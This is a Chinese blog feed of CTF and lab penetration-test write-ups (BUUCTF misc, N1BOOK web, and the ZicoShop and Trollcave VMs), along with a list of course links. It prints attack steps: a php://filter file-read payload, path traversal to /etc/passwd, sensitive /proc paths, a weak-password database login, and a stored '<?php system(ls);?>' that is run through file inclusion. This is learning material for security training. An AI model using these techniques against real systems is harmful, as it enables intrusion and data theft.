rel="noopener">文件</a>头：504B0304</p><p>RAR Archive (rar)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：52617221</p><h1 id="2021-1-21"><a href="#2021-1-21" class="headerlink" title="2021/1/21"></a>2021/1/21</h1><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>hint：神秘龙卷风转转转，科学家用四位数字为它命名，但是发现解密后居然是一串外星人代码！！好可怕！</p><p>四位数密码：5463</p><p>得到龙卷风：brainfuck解密</p><p>得flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><h2 id="BJDCTF-2nd-小姐姐-y1ng"><a href="#BJDCTF-2nd-小姐姐-y1ng" class="headerlink" title="[BJDCTF 2nd]小姐姐-y1ng"></a>[BJDCTF 2nd]小姐姐-y1ng</h2><p>WINHEX打开：</p><p>BJD{haokanma_xjj}</p><h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>hint：小白的网站被小黑攻击了，并且上传了Webshell，你能帮小白找到这个后门么？(Webshell中的密码(md5)即为答案)。</p><p>工具：D盾一扫就出来了</p><p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>得到文件：conf.bin</p><p>这是路由器配置文件。RouterPassView打开。</p><p>  找到：Username val=053700357621 </p><p>flag{053700357621}</p><h1 id="2021-1-22"><a href="#2021-1-22" class="headerlink" title="2021/1/22"></a>2021/1/22</h1><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>得到文件：stego100.wav</p><p>audacity打开，然后使劲放大得到电码</p><p>flag{5BC925649CB0188F52E617D70929191C}</p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>hint：公安机关近期截获到某网络犯罪团伙在线交流的数据包，但无法分析出具体的交流内容，聪明的你能帮公安机关找到线索吗？ </p><p>得到文件：流量中的线索.pcapng</p><p>wireshark抓包HTTP协议的200响应的得到base64编码</p><p><a href="https://the-x.cn/base64解码下载jpg格式图片" target="_blank" rel="noopener">https://the-x.cn/base64解码下载jpg格式图片</a></p><p>flag{209acebf6324a09671abc31c869de72c}</p><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>得到jpg图片，通过winhex发现有zip部分，后缀改为zip发现实伪加密，zip文件头为50 4B 01 02用010搜索一下，在14后面来改伪加密，得到一个jpg文件，用steghide解决问题：</p><pre><code>steghide info good.jpgsteghide extract -sf good.jpg</code></pre><p>关于这个用法，在windows上的用法简单，自己寻思吧，最后得到文件：ko.txt</p><p>利用里面的密码打开压缩包，就能得到flag</p><p>flag{1RTo8w@&amp;4nK@z*XL}</p><p>不错的一个题</p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>将得到图片后缀改为zip就能轻松打开</p><p>得到文件flag.vmdk，里面有个文件名字为nul在windows下面无法显示放到虚拟机试试</p><pre><code>7z x flag.vmdk -o./tree</code></pre><p>flag{N7F5_AD5_i5_funny!}</p><h1 id="2021-1-23"><a href="#2021-1-23" class="headerlink" title="2021/1/23"></a>2021/1/23</h1><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>hint：朋友的网站被黑客上传了webshell后门，他把网站打包备份了，你能帮忙找到黑客的webshell在哪吗？(Webshell中的密码(md5)即为答案)。</p><p>D盾一把梭</p><p>flag{ba8e6c6f35a53933b871480bb9a9545c}</p><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>hint：某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。</p><p>得到的文件用wireshark打开过滤只看HTTP</p><p>看到login数据包，查看分组字节流发现：name=admina&amp;word=adminb</p><p>adminaadminb搜索在线md5hash或者本地工具hash</p><p>flag{1d240aafe21a86afc11f38a45b541a49}</p><h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><p>知识点：F5隐写</p><p>kali中安装F5-steganography 工具</p><pre><code>git clone https://github.com/matthewgao/F5-steganography</code></pre><p>解密的时候输入：</p><pre><code>java Extract /图片的绝对路径 [-p 密码] [-e 输出文件]</code></pre><p>此处要粘贴文件名，然后得到文件output.txt，打开文本发现有pk字样，基本就可以确定是zip，所有不需要hxd打开，得到flag：flag{96efd0a2037d06f34199e921079778ee}</p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>改为zip文件得到key，cipher（密码）文件</p><p>key.txt打开得到：V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</p><p>base64解码后得到：What is Nicki Minaj’s favorite song that refers to snakes?（妮琪·米娜最喜欢的一首提到蛇的歌是什么？）百度得到巨蟒：anaconda（这个mv十分的带劲！！！！）</p><p><del>看完wp得知：</del>联想到以蛇命名的加密算法Serpent。以anaconda为密钥，用<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">在线工具</a>对cipher进行解密。</p><p>选择针对文件的解密，key就是anaconda，最后得到flag：</p><p>CTF{who_knew_serpent_cipher_existed}</p><h1 id="2021-1-24"><a href="#2021-1-24" class="headerlink" title="2021/1/24"></a>2021/1/24</h1><p>ctfshow大吉大利杯</p><h1 id="2021-01-25"><a href="#2021-01-25" class="headerlink" title="2021-01-25"></a>2021-01-25</h1><h2 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h2><p>题目：开局一张图，flag全靠<strong>猜</strong></p><p>因为出题人失误搞错了，解出来的key去掉后3位的com</p><p>右键属性，详细信息：新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</p><p>解得：gemlove</p><p>再根据题目中加粗的<strong>猜</strong>字，尝试使用outguess。</p><pre><code>git clone https://github.com/crorvick/outguess.gitcd outguess./configure &amp;&amp; make &amp;&amp; make installoutguess -k gemlove -r &#39;/root/outguess/CTF/sheng_huo_zhao_zhao.jpg&#39; flag.txtlscat flag.txtBJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></pre><p>按照wp来就行</p><h2 id="梅花香之苦寒来（水文）"><a href="#梅花香之苦寒来（水文）" class="headerlink" title="梅花香之苦寒来（水文）"></a>梅花香之苦寒来（水文）</h2><p>两种解法都失败，这里只记录一种简单的做法：</p><p>hxd打开看见ÿÙ（ff d9）是16进制开头的数字，转码ascⅡ得到神秘小坐标</p><p>gnuplot使用步骤</p><p>1.终端输入gnuplot</p><p>2.进入后输入plot ，文件直接拖进去</p><p>3.可以直接看到图了</p><p>文件格式只需要留下逗号</p><h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><p>得到文件后缀：pcapng，wireshark打开</p><h1 id="2021-01-26"><a href="#2021-01-26" class="headerlink" title="2021-01-26"></a>2021-01-26</h1><h2 id="少了一半？？-题目来自starsnow"><a href="#少了一半？？-题目来自starsnow" class="headerlink" title="少了一半？？(题目来自starsnow)"></a>少了一半？？(题目来自starsnow)</h2><p>得到的是jpg文件</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8826%E6%97%A51537_1.png" alt></p><p>这里将黑色标记的41改为EE得到flag</p><h1 id="2021-01-27"><a href="#2021-01-27" class="headerlink" title="2021-01-27"></a>2021-01-27</h1><p>学习php</p><p><a href="https://www.runoob.com/php/php-syntax.html" target="_blank" rel="noopener">PHP 语法</a></p><p><a href="https://www.runoob.com/php/php-variables.html" target="_blank" rel="noopener">PHP 变量</a></p><p><a href="https://www.runoob.com/php/php-echo-print.html" target="_blank" rel="noopener">PHP echo/print</a></p><p><a href="https://www.runoob.com/php/php-datatypes.html" target="_blank" rel="noopener">PHP 数据类型</a></p><p><a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">PHP 类型比较</a></p><p><a href="https://www.runoob.com/php/php-constants.html" target="_blank" rel="noopener">PHP 常量</a></p><p><a href="https://www.runoob.com/php/php-string.html" target="_blank" rel="noopener">PHP 字符串</a></p><p><a href="https://www.runoob.com/php/php-operators.html" target="_blank" rel="noopener">PHP 运算符</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1BOOK</title>
      <link href="/2021/01/15/n1book/"/>
      <url>/2021/01/15/n1book/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="N1book"><a href="#N1book" class="headerlink" title="N1book"></a>N1book</h1><h2 id="第一章-web入门"><a href="#第一章-web入门" class="headerlink" title="[第一章 web入门]"></a>[第一章 web入门]</h2><h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h3><p>题目：</p><p>Git测试</p><p>Hello, CTFer!</p><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><hr><p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p><p>very easy</p><p>看网上说这是git测试，听别人看书说要用一个工具叫：scrabble，但是我没有书，所以我就不和他用一样的工具：Githack</p><p>kali没有自己下载：</p><pre><code>git clone https://github.com/BugScanTeam/GitHackcd GitHackpython GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.git</code></pre><p>然后就发现<img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50926_2.png" alt></p><p>打开以后</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50927_3.png" alt></p><p>n1book{git_looks_s0_easyfun}</p><p>完事了</p><p>关于书上记载的关于githack的命令：</p><p>git log -all或git branch -v（看到master分支信息）</p><p>git reflog（看到一些checkout记录）</p><h2 id="常见的搜集"><a href="#常见的搜集" class="headerlink" title="常见的搜集"></a>常见的搜集</h2><h4 id="知识经验总结："><a href="#知识经验总结：" class="headerlink" title="知识经验总结："></a>知识经验总结：</h4><p><strong>常规文件</strong>：</p><ul><li>robots.txt记录一些目录和CMS版本信息</li><li>readme.md：记录CMS版本信息，有的甚至有github地址</li><li><a href="http://www.zip/rar/tar.gz：往往是网站的源码备份" target="_blank" rel="noopener">www.zip/rar/tar.gz：往往是网站的源码备份</a></li></ul><p><strong>vim备份文件</strong>：</p><p>第一次意外退出的备份文件为.flag.swp</p><p>第二次.flag.swo</p><p>第三次.flag.swn以此类推</p><p>实际环境环境中，网站的备份往往可能是网站域名的压缩包</p><p><strong>gedit备份文件</strong>：</p><p>gedit编辑器保存后，当前目录会生成一个后缀<del>的文件就比如flag</del></p><p>关于此题：</p><p>先访问/robots.txt文件得到：/flag1_is_her3_fun.txt访问得到：flag1:n1book{info_1</p><p>再试试<a href="http://www.zip发现没有什么结果" target="_blank" rel="noopener">www.zip发现没有什么结果</a></p><p>再试试index.php~</p><p>得flag2:s_v3ry_im</p><p>准备下载.index.php.swp</p><p>将后缀改为txt文件打开发现：</p><p>flag3:p0rtant_hack}</p><p>拼凑在一起齐了：n1book{info_1s_v3ry_imp0rtant_hack}</p><h2 id="afr-1"><a href="#afr-1" class="headerlink" title="afr_1"></a>afr_1</h2><p>任意文件读取漏洞</p><p>考点：php://filter/convert.base64-encode/resource=flag</p><p>得到：</p><pre><code>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</code></pre><p>解码得到：</p><pre><code>&lt;?phpdie(&#39;no no no&#39;);//n1book{afr_1_solved}</code></pre><h2 id="afr-2"><a href="#afr-2" class="headerlink" title="afr_2"></a>afr_2</h2><p>打开一看，发现精神小伙，f12发现来自img</p><p><a href="http://c363f79a-f65a-401d-a4bf-f29f0a8b3c90.node3.buuoj.cn/img/" target="_blank" rel="noopener">http://c363f79a-f65a-401d-a4bf-f29f0a8b3c90.node3.buuoj.cn/img/</a></p><p><a href="http://c363f79a-f65a-401d-a4bf-f29f0a8b3c90.node3.buuoj.cn/img../" target="_blank" rel="noopener">http://c363f79a-f65a-401d-a4bf-f29f0a8b3c90.node3.buuoj.cn/img../</a></p><p>打开目录下面的flag下载得</p><p>n1book{afr_2_solved}</p><h2 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h2><p>这个题考查的是/proc目录：</p><p>（14）/proc目录</p><p> /proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。</p><p>对应目录下的cmdline可读出比较敏感的信息，</p><p>Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。<br>/proc/[pid],当查看当前进程的时候可以用/proc/self代替<br>cmdline — 启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息<br>cwd — 指向当前进程运行目录的一个符号链接<br>environ — 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示</p><pre><code>/proc/sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用/proc/mounts # 挂载的文件系统列表/proc/net/arp # arp表，可以获得内网其他机器的地址/proc/net/route # 路由表信息/proc/net/tcp and /proc/net/udp # 活动连接的信息/proc/net/fib_trie # 路由缓存/proc/version  # 内核版本/proc/[PID]/cmdline # 可能包含有用的路径信息/proc/[PID]/environ #  程序运行的环境变量信息，可以用来包含getshell/proc/[PID]/cwd     # 当前进程的工作目录/proc/[PID]/fd/[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</code></pre><p>信息收集阶段：</p><p>点点点后，发现先URL变为：<a href="http://5461f9a1-2430-445b-ac0b-9766e62171bd.node3.buuoj.cn/article?name=article" target="_blank" rel="noopener">http://5461f9a1-2430-445b-ac0b-9766e62171bd.node3.buuoj.cn/article?name=article</a></p><p>这里可以传入参数，根据书上资料利用/proc/self/cmdline来显示当前进程</p><p>得到：pythonserver.py</p><p>也就是说，当前有py程序在运行，或者说，整个题目靠的是这个程序运作，查看源代码/proc/self/cwd/server.py</p><p>蹦出来一堆，看半天没看明白，因为后面考查的是flask模板注入</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 从0到1ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>千锋资源</title>
      <link href="/2021/01/14/qian-feng-zi-yuan/"/>
      <url>/2021/01/14/qian-feng-zi-yuan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="千峰在线学习地址："><a href="#千峰在线学习地址：" class="headerlink" title="千峰在线学习地址："></a><strong>千峰在线学习地址：</strong></h3><p><strong>在线观看地址：</strong><a href="http://www.mobiletrain.org/testing/video-list3.shtml" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list3.shtml</a><br><strong>官方B站地址：</strong><a href="https://space.bilibili.com/146668655" target="_blank" rel="noopener">https://space.bilibili.com/146668655</a><br><strong>官方知乎地址：</strong><a href="https://www.zhihu.com/org/qian-feng-jiao-yu-39" target="_blank" rel="noopener">https://www.zhihu.com/org/qian-feng-jiao-yu-39</a></p><h3 id="各学科学习资源："><a href="#各学科学习资源：" class="headerlink" title="各学科学习资源："></a><strong>各学科学习资源：</strong></h3><p><strong>Java：</strong><a href="http://www.mobiletrain.org/testing/video-list-java.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-java.shtml?ssss</a></p><p><strong>HTML5/web前端：</strong><a href="http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss</a></p><p><strong>Python：</strong><a href="http://www.mobiletrain.org/testing/video-list-python.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-python.shtml?ssss</a></p><p><strong>UI设计：</strong><a href="http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss</a></p><p><strong>Linux/云计算：</strong><a href="http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss</a></p><p><strong>软件测试：</strong><a href="http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss</a></p><p><strong>大数据：</strong><a href="http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss</a></p><p><strong>物联网：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss</a></p><p><strong>网络安全：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss</a></p><p><strong>互联网营销：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss</a></p><p><strong>go语言：</strong><a href="http://www.mobiletrain.org/testing/video-list-go.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-go.shtml?ssss</a></p><p><strong>Unity/游戏开发：</strong><a href="http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss</a></p><p><strong>PHP：</strong><a href="http://www.mobiletrain.org/testing/video-list-php.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-php.shtml?ssss</a></p><h3 id="计算机等级考试资源："><a href="#计算机等级考试资源：" class="headerlink" title="计算机等级考试资源："></a><strong>计算机等级考试资源：</strong></h3><p><strong>2020版_全国计算机等级考试二级Java程序设计</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1sT4y1F7Ka" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1sT4y1F7Ka</a><br>网盘链接：<a href="https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ</a> 提取码: 2igi<br><strong>2020版_全国计算机Python二级真题讲解</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1qy4y1B7wN" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1qy4y1B7wN</a><br>网盘链接：<a href="https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ</a> 提取码: fk9x<br><strong>2020版_全国计算机Web二级等级考试</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1GV411y7VT" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1GV411y7VT</a><br>网盘链接：<a href="https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg" target="_blank" rel="noopener">https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg</a> 提取码: fjxb<br><strong>2020年计算机全国等级考试二级C语言教程</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1Ht4y1i7tx" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ht4y1i7tx</a><br>网盘链接：<a href="https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA" target="_blank" rel="noopener">https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA</a> 提取码: 5v8p<br><strong>2020版_全国计算机MySQL二级等级考试</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1Ni4y137A7" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ni4y137A7</a><br>网盘链接：<a href="https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg" target="_blank" rel="noopener">https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg</a> 提取码: i622<br><strong>2020版全国计算机一级WPS Office全套考试教程</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1dK411A7fu" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1dK411A7fu</a><br>网盘链接：<a href="https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q</a> 提取码: 6ngp</p><h3 id="其他资源："><a href="#其他资源：" class="headerlink" title="其他资源："></a><strong>其他资源：</strong></h3><p><strong>最新千锋PMP项目管理视频 ：</strong><a href="https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg" target="_blank" rel="noopener">https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg</a> 提取码: m47c<br><strong>【源码】千锋教程书籍系列 ：</strong><a href="https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA" target="_blank" rel="noopener">https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZicoShop</title>
      <link href="/2021/01/09/zicoshop/"/>
      <url>/2021/01/09/zicoshop/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>简介：</p><p>是一个电子商务建站技术网站Zico-Shop</p><p>主要功能：</p><p>建站技术</p><p>网店案例</p><h2 id="发现服务："><a href="#发现服务：" class="headerlink" title="发现服务："></a>发现服务：</h2><p>补充：</p><p>-sV:V扫描到的服务的端口号，apache 2.4</p><p>-sT:TCP -sS:SYN  -A：显示详细的信息</p><p>得到目标主机开放端口和操作系统</p><pre><code>nmap -sP 192.168.204.0/24nmap -sS -Pn -n -A -O -T5 192.168.204.141</code></pre><p>发现端口：</p><p>22ssh</p><p>80HTTP</p><p>111rpcbind 2-4（不知道是什么的端口）</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>常识：</p><p>/etc/password存储linux系统所有的用户信息</p><p>linux网站文件的默认目录：/var/www</p><p>在URL内通过目录穿越../../../etc/passwd来尝试访问</p><p>发现：</p><p>The requested URL /etc/password was not found on this server.</p><p>那么该网站的二级目录再次进行查找</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51024_1.png" alt></p><p>点开以后的URL变为：</p><p><a href="http://192.168.204.141/view.php?page=tools.html" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=tools.html</a></p><p>修改参数：</p><p><a href="http://192.168.204.141/view.php?page=../../etc/passwd" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../etc/passwd</a></p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51058_2.png" alt></p><h2 id="目录发现："><a href="#目录发现：" class="headerlink" title="目录发现："></a>目录发现：</h2><pre><code>dirb http://192.168.204.141/ ←注意空格/usr/share/dirb/wordlists/common.txt</code></pre><p>发现以下目录：</p><pre><code>---- Scanning URL: http://192.168.204.141/ ----+ http://192.168.204.141/cgi-bin/ (CODE:403|SIZE:291)                           ==&gt; DIRECTORY: http://192.168.204.141/css/                                      ==&gt; DIRECTORY: http://192.168.204.141/dbadmin/                                  ==&gt; DIRECTORY: http://192.168.204.141/img/                                      + http://192.168.204.141/index (CODE:200|SIZE:7970)                             + http://192.168.204.141/index.html (CODE:200|SIZE:7970)                        ==&gt; DIRECTORY: http://192.168.204.141/js/                                       + http://192.168.204.141/LICENSE (CODE:200|SIZE:1094)                           + http://192.168.204.141/package (CODE:200|SIZE:789)                            + http://192.168.204.141/server-status (CODE:403|SIZE:296)                      + http://192.168.204.141/tools (CODE:200|SIZE:8355)                             ==&gt; DIRECTORY: http://192.168.204.141/vendor/                                   + http://192.168.204.141/view (CODE:200|SIZE:0)     </code></pre><p>访问dbadmin</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51127_3.png" alt></p><p>点击进入test_db.php</p><p>试试弱口令：admin登陆成功</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51130_4.png" alt></p><p>这个地方给人的感觉就像是可以管理数据库一样所以说应该可以上传一个东西到数据库什么的，而且就这个页面而言，创建一个新的数据库是没有问题的</p><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="1-创建新的数据库和表格"><a href="#1-创建新的数据库和表格" class="headerlink" title="1.创建新的数据库和表格"></a>1.创建新的数据库和表格</h3><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51142_6.png" alt></p><p>选择数据库：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51149_8.png" alt></p><p>创建表格：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51150_9.png" alt></p><h3 id="2-表格里储存可执行的php代码"><a href="#2-表格里储存可执行的php代码" class="headerlink" title="2.表格里储存可执行的php代码"></a>2.表格里储存可执行的php代码</h3><?php system(ls);?><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51159_10.png" alt></p><h3 id="3-php代码里执行远程主机命令"><a href="#3-php代码里执行远程主机命令" class="headerlink" title="3.php代码里执行远程主机命令"></a>3.php代码里执行远程主机命令</h3><p>通过之前的文件包含漏洞来执行</p><p><a href="http://192.168.204.141/view.php?page=../../usr/databases/bing.php" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../usr/databases/bing.php</a></p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51202_11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trollcave渗透测试</title>
      <link href="/2020/12/28/trollcave/"/>
      <url>/2020/12/28/trollcave/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>简介：一个社区论坛网站</p><p><em>“God himself cannot hack this website.” – dragon, site admin</em></p><p>很牛逼的介绍啊！！</p><h1 id="Trollcave渗透测试案例："><a href="#Trollcave渗透测试案例：" class="headerlink" title="Trollcave渗透测试案例："></a>Trollcave渗透测试案例：</h1><h2 id="1-了解其功能"><a href="#1-了解其功能" class="headerlink" title="1.了解其功能"></a>1.了解其功能</h2><p>主要功能：欢迎导语页面，密码重置，法律宗教</p><h2 id="2-发现服务（nmap）"><a href="#2-发现服务（nmap）" class="headerlink" title="2.发现服务（nmap）"></a>2.发现服务（nmap）</h2><h3 id="1-发现主机IP"><a href="#1-发现主机IP" class="headerlink" title="1.发现主机IP"></a>1.发现主机IP</h3><pre><code>nmap -sP</code></pre><h3 id="2-发现端口（服务）"><a href="#2-发现端口（服务）" class="headerlink" title="2.发现端口（服务）"></a>2.发现端口（服务）</h3><pre><code>nmap -sS -O（显示操作系统信息） -P0（无Ping扫描） -n（不进行dns解析） -Anmap -sS -O -P0 -n 